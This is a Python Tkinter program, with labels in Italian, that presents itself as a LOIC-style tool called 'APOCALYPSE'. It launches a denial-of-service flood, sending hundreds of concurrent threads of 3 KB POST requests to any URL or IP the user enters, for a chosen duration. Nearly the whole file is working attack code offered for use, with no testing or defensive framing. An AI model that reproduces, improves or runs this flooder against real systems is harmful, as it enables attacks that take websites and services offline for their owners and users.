import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
import threading
import requests
import random
import time
from urllib.parse import urlparse

attack_active = False
attack_lock = threading.Lock()
success_count = 0
fail_count = 0

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def send_3kb_request(target):
    try:
        payload = b'A' * 3072
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/octet-stream',
        }
        r = requests.post(target, data=payload, headers=headers, timeout=2)
        return r.status_code == 200
    except:
        return False

def fast_attack(target, duration, concurrency):
    global attack_active, success_count, fail_count
    start_time = time.time()
    threads = []
    def worker():
        global success_count, fail_count
        while attack_active and (time.time() - start_time) < duration:
            ok = send_3kb_request(target)
            if ok:
                success_count += 1
            else:
                fail_count += 1
            update_status_labels()
            time.sleep(random.uniform(0.01, 0.08))
    for _ in range(int(concurrency)):
        t = threading.Thread(target=worker, daemon=True)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

def update_status_labels():
    label_success.config(text=f"SUCCESSI: {success_count}", fg="#00FF00")
    label_fail.config(text=f"FALLITE: {fail_count}", fg="#FF2222")

def start_attack():
    global attack_active, success_count, fail_count
    with attack_lock:
        if attack_active:
            messagebox.showinfo("Info", "Attacco già in esecuzione!")
            return
        attack_active = True
        success_count = 0
        fail_count = 0
        update_status_labels()

    url = entry_url.get().strip()
    duration = entry_duration.get().strip()
    concurrency = entry_conc.get().strip()
    if not url or (not is_valid_url(url) and not url.replace('.', '').isdigit()):
        messagebox.showerror("Errore", "Inserisci un URL/IP valido.")
        with attack_lock:
            attack_active = False
        return
    try:
        duration = int(duration)
        concurrency = int(concurrency)
    except:
        messagebox.showerror("Errore", "Durata e concorrenza devono essere numeri interi.")
        with attack_lock:
            attack_active = False
        return

    def run_attack():
        fast_attack(url, duration, concurrency)
        with attack_lock:
            attack_active = False

    threading.Thread(target=run_attack, daemon=True).start()

def stop_attack():
    global attack_active
    with attack_lock:
        attack_active = False

# --- GUI ---

root = tk.Tk()
root.title("APOCALYPSE RED LOIC STYLE")
root.geometry("900x420")
root.resizable(False, False)
root.configure(bg="#111010")

# Layout principale: sinistra (logo+img) | destra (input + status)
main_frame = tk.Frame(root, bg="#111010")
main_frame.pack(fill="both", expand=True)

# --- SINISTRA: logo + immagine (25%) ---
left_frame = tk.Frame(main_frame, width=225, height=420, bg="#181818")
left_frame.pack(side="left", fill="y")
left_frame.pack_propagate(0)

# Immagine (skull)
try:
    img = Image.open("skull.jpg").resize((170, 100))
    photo = ImageTk.PhotoImage(img)
    img_label = tk.Label(left_frame, image=photo, bg="#181818")
    img_label.pack(pady=30)
except Exception:
    img_label = tk.Label(left_frame, text="[NO IMG]", bg="#181818", fg="red")
    img_label.pack(pady=30)

# Logo
tk.Label(
    left_frame, text="A P O C A L Y P S E", font=("OCR A Extended", 18, "bold"),
    fg="red", bg="#181818"
).pack(pady=10)

# --- DESTRA: parametri, bottoni, stato ---
right_frame = tk.Frame(main_frame, width=675, height=420, bg="#111010")
right_frame.pack(side="left", fill="both", expand=True)
right_frame.pack_propagate(0)

# Input parametri in alto
input_frame = tk.Frame(right_frame, bg="#111010")
input_frame.pack(pady=(25,10), anchor="nw")

def add_entry(label, default, width=28):
    l = tk.Label(input_frame, text=label, font=("Consolas", 11), fg="#FFF", bg="#111010")
    l.pack(side="left", padx=(0,2))
    e = tk.Entry(input_frame, font=("Consolas", 11), width=width, fg="red", bg="black", insertbackground="red")
    e.insert(0, default)
    e.pack(side="left", padx=(0,12))
    return e

entry_url = add_entry("Target:", "", 30)
entry_duration = add_entry("Durata (s):", "30", 5)
entry_conc = add_entry("Concorrenza:", "200", 5)

# Pulsanti
btn_frame = tk.Frame(right_frame, bg="#111010")
btn_frame.pack(pady=(0,10), anchor="nw")
btn_start = tk.Button(btn_frame, text="START", font=("OCR A Extended", 11, "bold"), fg="white", bg="red", width=12, height=1, command=start_attack)
btn_start.pack(side="left", padx=12)
btn_stop = tk.Button(btn_frame, text="STOP", font=("OCR A Extended", 11, "bold"), fg="white", bg="grey", width=12, height=1, command=stop_attack)
btn_stop.pack(side="left", padx=12)

# Stato: due linee come LOIC
status_frame = tk.Frame(right_frame, bg="#111010")
status_frame.pack(pady=40, anchor="nw")
label_success = tk.Label(status_frame, text="SUCCESSI: 0", font=("Consolas", 18, "bold"), fg="#00FF00", bg="#111010")
label_success.pack(anchor="w", pady=5)
label_fail = tk.Label(status_frame, text="FALLITE: 0", font=("Consolas", 18, "bold"), fg="#FF2222", bg="#111010")
label_fail.pack(anchor="w", pady=5)

root.mainloop()
